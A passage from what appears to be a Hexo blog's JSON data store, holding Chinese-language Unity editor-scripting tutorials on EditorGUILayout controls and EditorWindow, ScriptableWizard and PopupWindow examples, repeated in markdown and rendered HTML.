}\n</code></pre></li>\n</ul>\n<pre><code>* 8:Toolbar</code></pre><pre><code>int selected;\n\nvoid OnGUI()\n{\n    selected = GUILayout.Toolbar(selected, new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; });\n    selected = GUILayout.Toolbar(selected, new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; }, EditorStyles.toolbarButton);\n    selected = GUILayout.SelectionGrid(selected,new string[] { &quot;1&quot;, &quot;2&quot;, &quot;3&quot; }, 1, &quot;PreferencesKeysElement&quot;);\n}</code></pre><pre><code>* 9:SelectableLabel 可选择标签(通常用于显示只读信息，可以被复制粘贴)</code></pre><p>string text=”hiahia”;<br>    void OnGUI()<br>    {<br>        EditorGUILayout.SelectableLabel(text); //文本：可以选择然后复制粘贴<br>    }</p>\n<pre><code>* 10:PasswordField 密码字段</code></pre><pre><code>//创建密码字段并可视化\nstring text = &quot;Some text here&quot;;\nbool showBtn = true;\nvoid OnGUI() \n{\n    text = EditorGUILayout.PasswordField(&quot;Password:&quot;,text);\n    showBtn = EditorGUILayout.Toggle(&quot;Show Button&quot;, showBtn);\n    if (showBtn)\n    {\n        EditorGUILayout.LabelField(&quot;密码:&quot;, text);\n    }\n}</code></pre><pre><code>* 11:Slider 滑动条 IntSlider 整数滑动条 MinMaxSlider 最小最大滑动条</code></pre><pre><code>//随机放置选择的物体在最小最大滑动条之间\nfloat  minVal = -10.0f;\nfloat minLimit = -20.0f;\nfloat maxVal = 10.0f;\nfloat maxLimit = 20.0f;\nvoid OnGUI()\n{\n    EditorGUILayout.LabelField(&quot;Min Val:&quot;, minVal.ToString());\n    EditorGUILayout.LabelField(&quot;Max Val:&quot;, maxVal.ToString());\n    EditorGUILayout.MinMaxSlider(ref minVal,ref  maxVal, minLimit, maxLimit);\n\n}</code></pre><pre><code>* 12:Popup弹出选择菜单</code></pre><pre><code>string[] options = { &quot;Cube&quot;,&quot;Sphere&quot;,&quot;Plane&quot;};\nint index = 0;\nvoid OnGUI()\n{\n    index = EditorGUILayout.Popup(index, options);\n}</code></pre><pre><code></code></pre><pre><code>enum OPTIONS\n{\n    CUBE = 0,\n    SPHERE = 1,\n    PLANE = 2\n}\npublic class myEditor3 : EditorWindow {\n    OPTIONS op=OPTIONS.CUBE;\n    [MenuItem(&quot;cayman/tempShow&quot;)]\n    static void newWelcome()\n    {\n        EditorWindow.GetWindow(typeof(myEditor3), true, &quot;Eam&quot;);\n    }\n    void OnGUI()\n    {\n    op = (OPTIONS)EditorGUILayout.EnumPopup(&quot;Primitive to create:&quot;, op)  ;\n    }\n}</code></pre><pre><code></code></pre><pre><code>int selectedSize = 1;\nstring[] names = { &quot;Normal&quot;,&quot;Double&quot;,&quot;Quadruple&quot;};\nint[] sizes = { 1,2,4};\nvoid OnGUI()\n{\n    selectedSize = EditorGUILayout.IntPopup(&quot;Resize Scale: &quot;, selectedSize, names, sizes);\n    if (GUILayout.Button(&quot;Scale&quot;))\n        ReScale();\n}\nvoid ReScale()\n{\n    if (Selection.activeTransform)\n        Selection.activeTransform.localScale =new Vector3(selectedSize, selectedSize, selectedSize);\n    else Debug.LogError(&quot;No Object selected, please select an object to scale.&quot;);\n}</code></pre><pre><code>\n* 13:ColorField 颜色字段 </code></pre><pre><code>Color matColor = Color.white;\nvoid OnGUI()\n{\n    matColor = EditorGUILayout.ColorField(&quot;New Color&quot;, matColor);\n\n}</code></pre><pre><code>* 14:Vector2Field 二维向量字段 Vector3Field 三维向量字段(略，同2维)</code></pre><pre><code>float distance = 0;\nVector2 p1, p2;\nvoid OnGUI()\n{\n    p1 = EditorGUILayout.Vector2Field(&quot;Point 1:&quot;, p1);\n    p2 = EditorGUILayout.Vector2Field(&quot;Point 2:&quot;, p2);\n    EditorGUILayout.LabelField(&quot;Distance:&quot;, distance.ToString());\n}\nvoid OnInspectorUpdate() //面板刷新\n{\n    distance = Vector2.Distance(p1, p2);\n    this.Repaint();\n}</code></pre><pre><code>* 15:TagField 标签字段 LayerField层字段</code></pre><pre><code>string tagStr = &quot;&quot;;\nint selectedLayer=0;\nvoid OnGUI()\n{  //为游戏物体设置\n    tagStr = EditorGUILayout.TagField(&quot;Tag for Objects:&quot;, tagStr);\n    tagStr = EditorGUILayout.LayerField(&quot;Layer for Objects:&quot;, selectedLayer);\n    if (GUILayout.Button(&quot;Set Tag!&quot;))\n        SetTags();\n    if(GUILayout.Button(&quot;Set Layer!&quot;))\n        SetLayer();\n}\nvoid SetTags() {\n    foreach(GameObject go in Selection.gameObjects)\n        go.tag = tagStr;\n}\n void SetLayer() {\n    foreach(GameObject go in Selection.gameObjects)\n        go.laye = selectedLayer;\n}</code></pre><pre><code>* 16:打开保存位置文件夹</code></pre><p>string path;<br>GUILayout.Label (“Save Path”, EditorStyles.boldLabel);<br>EditorGUILayout.BeginHorizontal();<br>EditorGUILayout.TextField(path,GUILayout.ExpandWidth(false));<br>if(GUILayout.Button(“Browse”,GUILayout.ExpandWidth(false)))<br>            path = EditorUtility.SaveFolderPanel(“Path to Save Images”,path,Application.dataPath);   //打开保存文件夹面板<br>EditorGUILayout.EndHorizontal();</p>\n<pre><code>* 17:折叠标签,下面的player.weaponDamage1和player.weaponDamage2属性,都会被折叠在Weapons标签里面</code></pre><pre><code>    bool showWeapons;\n    showWeapons = EditorGUILayout.Foldout(showWeapons, &quot;Weapons&quot;);\n    if (showWeapons)\n    {\n        player.weaponDamage1 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage1);\n        player.weaponDamage2 = EditorGUILayout.FloatField(&quot;武器伤害1&quot;, player.weaponDamage2);\n    }</code></pre><pre><code>* 18:滑动区域 GUILayout.BeginScrollView  GUILayout.EndScrollView();\n选择网格 SelectionGrid,SelectionGrid(int 选择的索引,sting[] 显示文字数组，xCount，格式)</code></pre><pre><code>GUIStyle textStyle = new GUIStyle(&quot;textfield&quot;);\nGUIStyle buttonStyle = new GUIStyle(&quot;button&quot;);\ntextStyle.active = buttonStyle.active;\ntextStyle.onNormal = buttonStyle.onNormal;\n\nv2 = GUILayout.BeginScrollView(v2, true, true, GUILayout.Width(300), GUILayout.Height(100));\n{\n    v = GUILayout.SelectionGrid(v, Messages, 1, textStyle);\n}\nGUILayout.EndScrollView();</code></pre><pre><code>* 19:DragAndDrop中的拖拽区域,拖拽一个物体到windos面板上面,得到路径</code></pre><pre><code>    EditorGUILayout.LabelField(&quot;路径&quot;);\n    //获得一个长300的框  \n    Rect rect = EditorGUILayout.GetControlRect(GUILayout.Width(600));\n    //将上面的框作为文本输入框  \n    path = EditorGUI.TextField(rect, path);\n\n    //如果鼠标正在拖拽中或拖拽结束时，并且鼠标所在位置在文本输入框内  \n    if ((Event.current.type == EventType.DragUpdated\n      || Event.current.type == EventType.DragExited)\n      &amp;&amp; rect.Contains(Event.current.mousePosition))\n    {\n        //改变鼠标的外表  \n        DragAndDrop.visualMode = DragAndDropVisualMode.Generic;\n        if (DragAndDrop.paths != null &amp;&amp; DragAndDrop.paths.Length &gt; 0)\n        {\n            path = DragAndDrop.paths[0];\n        }\n    }</code></pre><p>```</p>\n<ul>\n<li>20:Box绘制GUI.Box(xxx,xxx)</li>\n<li>21:window面板的提示1. 打开一个通知栏 this.ShowNotification(new GUIContent(“This is a Notification”));2. 关闭通知栏 this.RemoveNotification();</li>\n<li>22:</li>\n</ul>\n"},{"title":"5 EditorWindow","date":"2020-05-11T03:41:32.000Z","top":5,"_content":"# EditorWindow 编辑器窗口\n\n* 1:介绍,unity中的场景窗口、游戏窗口、电影窗口等，所有这些都是EditorWindow。Unity编辑是集合了具有各种功能的editor窗而成的。\n\n# 编写弹出窗口代码\n\n* 1:第一种写法弹出窗口\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            if (testWindow == null)\n            {\n                testWindow = CreateInstance<TestEditorWindow>();\n            }\n            testWindow.Show();\n        }\n    }\n```\n\n* 2:第二种写法,GetWindow方法是上面写的一堆API的集合,并且缓存了一个 TestEditorWindow 再次获取并不会重新生成一个\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            GetWindow<TestEditorWindow>();\n        }\n    }\n```\n* 3: EditorWindow.ShowUtility 工具窗口将总是在标准窗口的前面，并在用户切换另一个应用程序时隐藏。\n```\n        if (exampleWindow == null) {\n            exampleWindow = CreateInstance<Example> ();\n        }\n        exampleWindow.ShowUtility ();\n```\n* 4:  EditorWindow.ShowPopup 没有关闭按钮,按下esc键关闭\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            \n            if (testWindow == null)\n            {\n                testWindow = CreateInstance<TestEditorWindow>();\n            }\n            testWindow.ShowPopup();\n        }\n\n\n        void OnGUI()\n        {\n            if (Event.current.keyCode == KeyCode.Escape)\n            {\n                testWindow.Close();\n            }\n        }\n    }\n```\n* 5: PopupWindow,在Editor中再弹出一个窗口\n```\n    public class TestPopupWindow : EditorWindow\n    {\n        static TestPopupWindow testWindow;\n        [MenuItem(\"Tools/Pop\")]\n        static void Open()\n        {\n            GetWindow<TestPopupWindow>();\n        }\n\n        ExamplePupupContent popupContent = new ExamplePupupContent();\n\n        void OnGUI()\n        {\n            if (GUILayout.Button(\"PopupContent\", GUILayout.Width(128)))\n            {\n                var activatorRect = GUILayoutUtility.GetLastRect();\n                PopupWindow.Show(activatorRect, popupContent);\n            }\n        }\n    }\n\n    public class ExamplePupupContent : PopupWindowContent\n    {\n        public override void OnGUI(Rect rect)\n        {\n            EditorGUILayout.LabelField(\"Lebel\");\n        }\n\n        public override void OnOpen()\n        {\n            Debug.Log(\"打开pop窗口\");\n        }\n\n        public override void OnClose()\n        {\n            Debug.Log(\"关闭pop窗口\");\n        }\n\n        public override Vector2 GetWindowSize()\n        {\n            return new Vector2(300, 100);\n        }\n    }\n```\n* 6:点击其他区域会关闭\n```\n    public class Example : EditorWindow\n    {\n        static Example exampleWindow;\n\n        [MenuItem(\"Tools/Drop\")]\n        static void Open()\n        {\n            if (exampleWindow == null)\n            {\n                exampleWindow = CreateInstance<Example>();\n            }\n\n            var buttonRect = new Rect(100, 100, 300, 100);\n            var windowSize = new Vector2(300, 100);\n            exampleWindow.ShowAsDropDown(buttonRect, windowSize);\n        }\n    }\n```\n* 7:ScriptableWizard简单制作\n```\n\npublic class Example1 : ScriptableWizard\n{\n    [MenuItem(\"Tools/ScriptableWizard\")]\n    static void Open()\n    {\n        DisplayWizard<Example1>(\"Example Wizard\");\n    }\n\n    void OnWizardCreate()\n    {\n        new GameObject(\"gameObjectName\");\n    }\n    void OnWizardUpdate()\n    {\n        Debug.Log(\"Update\");\n    }\n    protected override bool DrawWizardGUI()\n    {\n        EditorGUILayout.LabelField(\"Label\");\n        return true;\n    }\n    void OnWizardOtherButton()\n    {\n        var gameObject = GameObject.Find(\"gameObjectName\");\n\n        if (gameObject == null)\n        {\n            Debug.Log(\"找不到\");\n        }\n    }\n}\n```\n* 8:PreferenceItem是用于在Unity Preferences中添加菜单的功能。Unity Preferences是为了对Unity编辑产生影响的设定。\n```\n    using UnityEditor;\n\n    public class Example\n    {\n        [PreferenceItem(\"Example\")]\n        static void OnPreferenceGUI ()\n        {\n\n        }\n    }\n```\n* 9:添加菜单的IHasCustomMenu\n```\n    using UnityEditor;\n    using UnityEngine;\n\n    public class Example : EditorWindow, IHasCustomMenu\n    {\n\n        public void AddItemsToMenu (GenericMenu menu)\n        {\n            menu.AddItem (new GUIContent (\"example\"), false, () => {\n\n            });\n\n            menu.AddItem (new GUIContent (\"example2\"), true, () => {\n\n            });\n        }\n\n        [MenuItem(\"Window/Example\")]\n        static void Open ()\n        {\n            GetWindow<Example> ();\n        }\n    }\n```\n* 10:重设图标和title\n```\n    using UnityEditor;\n    using UnityEngine;\n\n    public class Example : EditorWindow\n    {\n        [MenuItem (\"Window/Example\")]\n        static void SaveEditorWindow ()\n        {\n            var window = GetWindow<Example> ();\n\n            var icon = AssetDatabase.LoadAssetAtPath<Texture> (\"Assets/Editor/Example.png\");\n\n            window.titleContent = new GUIContent (\"Hoge\", icon);\n        }\n    }\n```\n* 11:将EditorWindow中的数据保存为ScriptableObject \n```\n    using UnityEditor;\n    using UnityEngine;\n    public class Example : EditorWindow\n    {\n        [MenuItem (\"Assets/Save EditorWindow\")]\n        static void SaveEditorWindow ()\n        {\n            AssetDatabase.CreateAsset (CreateInstance<Example> (), \"Assets/Example.asset\");\n            AssetDatabase.Refresh ();\n        }\n\n        [SerializeField]\n        string text;\n\n        [SerializeField]\n        bool boolean;\n    }\n```","source":"_posts/Unity/UnityEditor/5 EditorWindow.md","raw":"---\ntitle: 5 EditorWindow\ndate: 2020-05-11 11:41:32\ntop: 5\ncategories:\n- Unity\ntags:\n- UnityEditor\n---\n# EditorWindow 编辑器窗口\n\n* 1:介绍,unity中的场景窗口、游戏窗口、电影窗口等，所有这些都是EditorWindow。Unity编辑是集合了具有各种功能的editor窗而成的。\n\n# 编写弹出窗口代码\n\n* 1:第一种写法弹出窗口\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            if (testWindow == null)\n            {\n                testWindow = CreateInstance<TestEditorWindow>();\n            }\n            testWindow.Show();\n        }\n    }\n```\n\n* 2:第二种写法,GetWindow方法是上面写的一堆API的集合,并且缓存了一个 TestEditorWindow 再次获取并不会重新生成一个\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            GetWindow<TestEditorWindow>();\n        }\n    }\n```\n* 3: EditorWindow.ShowUtility 工具窗口将总是在标准窗口的前面，并在用户切换另一个应用程序时隐藏。\n```\n        if (exampleWindow == null) {\n            exampleWindow = CreateInstance<Example> ();\n        }\n        exampleWindow.ShowUtility ();\n```\n* 4:  EditorWindow.ShowPopup 没有关闭按钮,按下esc键关闭\n```\n    public class TestEditorWindow : EditorWindow\n    {\n        static TestEditorWindow testWindow;\n\n        [MenuItem(\"Tools/Example\")]\n        static void Open()\n        {\n            \n            if (testWindow == null)\n            {\n                testWindow = CreateInstance<TestEditorWindow>();\n            }\n            testWindow.ShowPopup();\n        }\n\n\n        void OnGUI()\n        {\n            if (Event.current.keyCode == KeyCode.Escape)\n            {\n                testWindow.Close();\n            }\n        }\n    }\n```\n* 5: PopupWindow,在Editor中再弹出一个窗口\n```\n    public class TestPopupWindow : EditorWindow\n    {\n        static TestPopupWindow testWindow;\n        [MenuItem(\"Tools/Pop\")]\n        static void Open()\n        {\n            GetWindow<TestPopupWindow>();\n        }\n\n        ExamplePupupContent popupContent = new ExamplePupupContent();\n\n        void OnGUI()\n        {\n            if (GUILayout.Button(\"PopupContent\", GUILayout.Width(128)))\n            {\n                var activatorRect = GUILayoutUtility.GetLastRect();\n                PopupWindow.Show(activatorRect, popupContent);\n            }\n        }\n    }\n\n    public class ExamplePupupContent : PopupWindowContent\n    {\n        public override void OnGUI(Rect rect)\n        {\n            EditorGUILayout.LabelField(\"Lebel\");\n        }\n\n        public override void OnOpen()\n        {\n            Debug.Log(\"打开pop窗口\");\n        }\n\n        public override void OnClose()\n        {\n            Debug.Log(\"关闭pop窗口\");\n        }\n\n        public override Vector2 GetWindowSize()\n        {\n            return new Vector2(300, 100);\n        }\n    }\n```\n* 6:点击其他区域会关闭\n```\n    public class Example : EditorWindow\n    {\n        static Example exampleWindow;\n\n        [MenuItem(\"Tools/Drop\")]\n        static void Open()\n        {\n            if (exampleWindow == null)\n            {\n                exampleWindow = CreateInstance<Example>();\n            }\n\n            var buttonRect = new Rect(100, 100, 300, 100);\n            var windowSize = new Vector2(300, 100);\n            exampleWindow.ShowAsDropDown(buttonRect, windowSize);\n        }\n    }\n```\n* 7:ScriptableWizard简单制作\n```\n\npublic class Example1 : ScriptableWizard\n{\n    [MenuItem(\"Tools/ScriptableWizard\")]\n    static void Open()\n    {\n        DisplayWizard<Example1>(\"Example Wizard\");\n    }\n\n    void OnWizardCreate()\n    {\n        new GameObject(\"gameObjectName\");\n    }\n    void OnWizardUpdate()\n    {\n        Debug.Log(\"Update\");\n    }\n    protected override bool DrawWizardGUI()\n    {\n        EditorGUILayout.LabelField(\"Label\");\n        return true;\n    }\n    void OnWizardOtherButton()\n    {\n        var gameObject = GameObject.Find(\"gameObjectName\");\n\n        if (gameObject == null)\n        {\n            Debug.Log(\"找不到\");\n        }\n    }\n}\n```\n* 8:PreferenceItem是用于在Unity Preferences中添加菜单的功能。Unity Preferences是为了对Unity编辑产生影响的设定。\n```\n    using UnityEditor;\n\n    public class Example\n    {\n        [PreferenceItem(\"Example\")]\n        static void OnPreferenceGUI ()\n        {\n\n        }\n    }\n```\n* 9:添加菜单的IHasCustomMenu\n```\n    using UnityEditor;\n    using UnityEngine;\n\n    public class Example : EditorWindow, IHasCustomMenu\n    {\n\n        public void AddItemsToMenu (GenericMenu menu)\n        {\n            menu.AddItem (new GUIContent (\"example\"), false, () => {\n\n            });\n\n            menu.AddItem (new GUIContent (\"example2\"), true, () => {\n\n            });\n        }\n\n        [MenuItem(\"Window/Example\")]\n        static void Open ()\n        {\n            GetWindow<Example> ();\n        }\n    }\n```\n* 10:重设图标和title\n```\n    using UnityEditor;\n    using UnityEngine;\n\n    public class Example : EditorWindow\n    {\n        [MenuItem (\"Window/Example\")]\n        static void SaveEditorWindow ()\n        {\n            var window = GetWindow<Example> ();\n\n            var icon = AssetDatabase.LoadAssetAtPath<Texture> (\"Assets/Editor/Example.png\");\n\n            window.titleContent = new GUIContent (\"Hoge\", icon);\n        }\n    }\n```\n* 11:将EditorWindow中的数据保存为ScriptableObject \n```\n    using UnityEditor;\n    using UnityEngine;\n    public class Example : EditorWindow\n    {\n        [MenuItem (\"Assets/Save EditorWindow\")]\n        static void SaveEditorWindow ()\n        {\n            AssetDatabase.CreateAsset (CreateInstance<Example> (), \"Assets/Example.asset\");\n            AssetDatabase.Refresh ();\n        }\n\n        [SerializeField]\n        string text;\n\n        [SerializeField]\n        bool boolean;\n    }\n```","slug":"Unity/UnityEditor/5 EditorWindow","published":1,"updated":"2020-05-15T02:50:23.255Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0x005e2gk763sw8joo","content":"<h1 id=\"EditorWindow-编辑器窗口\"><a href=\"#EditorWindow-编辑器窗口\" class=\"headerlink\" title=\"EditorWindow 编辑器窗口\"></a>EditorWindow 编辑器窗口</h1><ul>\n<li>1:介绍,unity中的场景窗口、游戏窗口、电影窗口等，所有这些都是EditorWindow。Unity编辑是集合了具有各种功能的editor窗而成的。</li>\n</ul>\n<h1 id=\"编写弹出窗口代码\"><a href=\"#编写弹出窗口代码\" class=\"headerlink\" title=\"编写弹出窗口代码\"></a>编写弹出窗口代码</h1><ul>\n<li><p>1:第一种写法弹出窗口</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n          if (testWindow == null)\n          {\n              testWindow = CreateInstance&lt;TestEditorWindow&gt;();\n          }\n          testWindow.Show();\n      }\n  }</code></pre></li>\n<li><p>2:第二种写法,GetWindow方法是上面写的一堆API的集合,并且缓存了一个 TestEditorWindow 再次获取并不会重新生成一个</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n          GetWindow&lt;TestEditorWindow&gt;();\n      }\n  }</code></pre></li>\n<li><p>3: EditorWindow.ShowUtility 工具窗口将总是在标准窗口的前面，并在用户切换另一个应用程序时隐藏。</p>\n<pre><code>      if (exampleWindow == null) {\n          exampleWindow = CreateInstance&lt;Example&gt; ();\n      }\n      exampleWindow.ShowUtility ();</code></pre></li>\n<li><p>4:  EditorWindow.ShowPopup 没有关闭按钮,按下esc键关闭</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n\n          if (testWindow == null)\n          {\n              testWindow = CreateInstance&lt;TestEditorWindow&gt;();\n          }\n          testWindow.ShowPopup();\n      }\n\n</code></pre></li>\n</ul>\n<pre><code>    void OnGUI()\n    {\n        if (Event.current.keyCode == KeyCode.Escape)\n        {\n            testWindow.Close();\n        }\n    }\n}</code></pre><pre><code>* 5: PopupWindow,在Editor中再弹出一个窗口</code></pre><pre><code>public class TestPopupWindow : EditorWindow\n{\n    static TestPopupWindow testWindow;\n    [MenuItem(&quot;Tools/Pop&quot;)]\n    static void Open()\n    {\n        GetWindow&lt;TestPopupWindow&gt;();\n    }\n\n    ExamplePupupContent popupContent = new ExamplePupupContent();\n\n    void OnGUI()\n    {\n        if (GUILayout.Button(&quot;PopupContent&quot;, GUILayout.Width(128)))\n        {\n            var activatorRect = GUILayoutUtility.GetLastRect();\n            PopupWindow.Show(activatorRect, popupContent);\n        }\n    }\n}\n\npublic class ExamplePupupContent : PopupWindowContent\n{\n    public override void OnGUI(Rect rect)\n    {\n        EditorGUILayout.LabelField(&quot;Lebel&quot;);\n    }\n\n    public override void OnOpen()\n    {\n        Debug.Log(&quot;打开pop窗口&quot;);\n    }\n\n    public override void OnClose()\n    {\n        Debug.Log(&quot;关闭pop窗口&quot;);\n    }\n\n    public override Vector2 GetWindowSize()\n    {\n        return new Vector2(300, 100);\n    }\n}</code></pre><pre><code>* 6:点击其他区域会关闭</code></pre><pre><code>public class Example : EditorWindow\n{\n    static Example exampleWindow;\n\n    [MenuItem(&quot;Tools/Drop&quot;)]\n    static void Open()\n    {\n        if (exampleWindow == null)\n        {\n            exampleWindow = CreateInstance&lt;Example&gt;();\n        }\n\n        var buttonRect = new Rect(100, 100, 300, 100);\n        var windowSize = new Vector2(300, 100);\n        exampleWindow.ShowAsDropDown(buttonRect, windowSize);\n    }\n}</code></pre><pre><code>* 7:ScriptableWizard简单制作</code></pre><p>public class Example1 : ScriptableWizard<br>{<br>    [MenuItem(“Tools/ScriptableWizard”)]<br>    static void Open()<br>    {<br>        DisplayWizard<Example1>(“Example Wizard”);<br>    }</Example1></p>\n<pre><code>void OnWizardCreate()\n{\n    new GameObject(&quot;gameObjectName&quot;);\n}\nvoid OnWizardUpdate()\n{\n    Debug.Log(&quot;Update&quot;);\n}\nprotected override bool DrawWizardGUI()\n{\n    EditorGUILayout.LabelField(&quot;Label&quot;);\n    return true;\n}\nvoid OnWizardOtherButton()\n{\n    var gameObject = GameObject.Find(&quot;gameObjectName&quot;);\n\n    if (gameObject == null)\n    {\n        Debug.Log(&quot;找不到&quot;);\n    }\n}</code></pre><p>}</p>\n<pre><code>* 8:PreferenceItem是用于在Unity Preferences中添加菜单的功能。Unity Preferences是为了对Unity编辑产生影响的设定。</code></pre><pre><code>using UnityEditor;\n\npublic class Example\n{\n    [PreferenceItem(&quot;Example&quot;)]\n    static void OnPreferenceGUI ()\n    {\n\n    }\n}</code></pre><pre><code>* 9:添加菜单的IHasCustomMenu</code></pre><pre><code>using UnityEditor;\nusing UnityEngine;\n\npublic class Example : EditorWindow, IHasCustomMenu\n{\n\n    public void AddItemsToMenu (GenericMenu menu)\n    {\n        menu.AddItem (new GUIContent (&quot;example&quot;), false, () =&gt; {\n\n        });\n\n        menu.AddItem (new GUIContent (&quot;example2&quot;), true, () =&gt; {\n\n        });\n    }\n\n    [MenuItem(&quot;Window/Example&quot;)]\n    static void Open ()\n    {\n        GetWindow&lt;Example&gt; ();\n    }\n}</code></pre><pre><code>* 10:重设图标和title</code></pre><pre><code>using UnityEditor;\nusing UnityEngine;\n\npublic class Example : EditorWindow\n{\n    [MenuItem (&quot;Window/Example&quot;)]\n    static void SaveEditorWindow ()\n    {\n        var window = GetWindow&lt;Example&gt; ();\n\n        var icon = AssetDatabase.LoadAssetAtPath&lt;Texture&gt; (&quot;Assets/Editor/Example.png&quot;);\n\n        window.titleContent = new GUIContent (&quot;Hoge&quot;, icon);\n    }\n}</code></pre><pre><code>* 11:将EditorWindow中的数据保存为ScriptableObject </code></pre><pre><code>using UnityEditor;\nusing UnityEngine;\npublic class Example : EditorWindow\n{\n    [MenuItem (&quot;Assets/Save EditorWindow&quot;)]\n    static void SaveEditorWindow ()\n    {\n        AssetDatabase.CreateAsset (CreateInstance&lt;Example&gt; (), &quot;Assets/Example.asset&quot;);\n        AssetDatabase.Refresh ();\n    }\n\n    [SerializeField]\n    string text;\n\n    [SerializeField]\n    bool boolean;\n}</code></pre><p>```</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"EditorWindow-编辑器窗口\"><a href=\"#EditorWindow-编辑器窗口\" class=\"headerlink\" title=\"EditorWindow 编辑器窗口\"></a>EditorWindow 编辑器窗口</h1><ul>\n<li>1:介绍,unity中的场景窗口、游戏窗口、电影窗口等，所有这些都是EditorWindow。Unity编辑是集合了具有各种功能的editor窗而成的。</li>\n</ul>\n<h1 id=\"编写弹出窗口代码\"><a href=\"#编写弹出窗口代码\" class=\"headerlink\" title=\"编写弹出窗口代码\"></a>编写弹出窗口代码</h1><ul>\n<li><p>1:第一种写法弹出窗口</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n          if (testWindow == null)\n          {\n              testWindow = CreateInstance&lt;TestEditorWindow&gt;();\n          }\n          testWindow.Show();\n      }\n  }</code></pre></li>\n<li><p>2:第二种写法,GetWindow方法是上面写的一堆API的集合,并且缓存了一个 TestEditorWindow 再次获取并不会重新生成一个</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n          GetWindow&lt;TestEditorWindow&gt;();\n      }\n  }</code></pre></li>\n<li><p>3: EditorWindow.ShowUtility 工具窗口将总是在标准窗口的前面，并在用户切换另一个应用程序时隐藏。</p>\n<pre><code>      if (exampleWindow == null) {\n          exampleWindow = CreateInstance&lt;Example&gt; ();\n      }\n      exampleWindow.ShowUtility ();</code></pre></li>\n<li><p>4:  EditorWindow.ShowPopup 没有关闭按钮,按下esc键关闭</p>\n<pre><code>  public class TestEditorWindow : EditorWindow\n  {\n      static TestEditorWindow testWindow;\n\n      [MenuItem(&quot;Tools/Example&quot;)]\n      static void Open()\n      {\n\n          if (testWindow == null)\n          {\n              testWindow = CreateInstance&lt;TestEditorWindow&gt;();\n          }\n          testWindow.ShowPopup();\n      }\n\n</code></pre></li>\n</ul>\n<pre><code>    void OnGUI()\n    {\n        if (Event.current.keyCode == KeyCode.Escape)\n        {\n            testWindow.Close();\n        }\n    }\n}</code></pre><pre><code>* 5: PopupWindow,在Editor中再弹出一个窗口</code></pre><pre><code>public class TestPopupWindow : EditorWindow\n{\n    static TestPopupWindow testWindow;\n    [MenuItem(&quot;Tools/Pop&quot;)]\n    static void Open()\n    {\n        GetWindow&lt;TestPopupWindow&gt;();\n    }\n\n    ExamplePupupContent popupContent = new ExamplePupupContent();\n\n    void OnGUI()\n    {\n        if (GUILayout.Button(&quot;PopupContent&quot;, GUILayout.Width(128)))\n        {\n            var activatorRect = GUILayoutUtility.GetLastRect();\n            PopupWindow.Show(activatorRect, popupContent);\n        }\n    }\n}\n\npublic class ExamplePupupContent : PopupWindowContent\n{\n    public override void OnGUI(Rect rect)\n    {\n        EditorGUILayout.LabelField(&quot;Lebel&quot;);\n    }\n\n    public override void OnOpen()\n    {\n        Debug.Log(&quot;打开pop窗口&quot;);\n    }\n\n    public override void OnClose()\n    {\n        Debug.Log(&quot;关闭pop窗口&quot;);\n    }\n\n    public override Vector2 GetWindowSize()\n    {\n        return new Vector2(300, 100);\n    }\n}</code></pre><pre><code>* 6:点击其他区域会关闭</code></pre><pre><code>public class Example : EditorWindow\n{\n    static Example exampleWindow;\n\n    [MenuItem(&quot;Tools/Drop&quot;)]\n    static void Open()\n    {\n        if (exampleWindow == null)\n        {\n            exampleWindow = CreateInstance&lt;Example&gt;();\n        }\n\n        var buttonRect = new Rect(100, 100, 300, 100);\n        var windowSize = new Vector2(300, 100);\n        exampleWindow.ShowAsDropDown(buttonRect, windowSize);\n    }\n}</code></pre><pre><code>* 7:ScriptableWizard简单制作</code></pre><p>public class Example1 : ScriptableWizard<br>{<br>    [MenuItem(“Tools/ScriptableWizard”)]<br>    static void Open()<br>    {<br>        DisplayWizard<Example1>(“Example Wizard”);<br>    }</Example1></p>\n<pre><code>void OnWizardCreate()\n{\n    new GameObject(&quot;gameObjectName&quot;);\n}\nvoid OnWizardUpdate()\n{\n    Debug.Log(&quot;Update&quot;);\n}\nprotected override bool DrawWizardGUI()\n{\n    EditorGUILayout.LabelField(&quot;Label&quot;);\n    return true;\n}\nvoid OnWizardOtherButton()\n{\n    var gameObject = GameObject.Find(&quot;gameObjectName&quot;);\n\n    if (gameObject == null)\n    {\n        Debug.Log(&quot;找不到&quot;);\n    }\n}</code></pre><p>}</p>\n<pre><code>* 8:PreferenceItem是用于在Unity Preferences中添加菜单的功能。Unity Preferences是为了对Unity编辑产生影响的设定。</code></pre><pre><code>using UnityEditor;\n\npublic class Example\n{\n    [PreferenceItem(&quot;Example&quot;)]\n    static void OnPreferenceGUI ()\n    {\n\n    }\n}</code></pre><pre><code>* 9:添加菜单的IHasCustomMenu</code></pre><pre><code>using 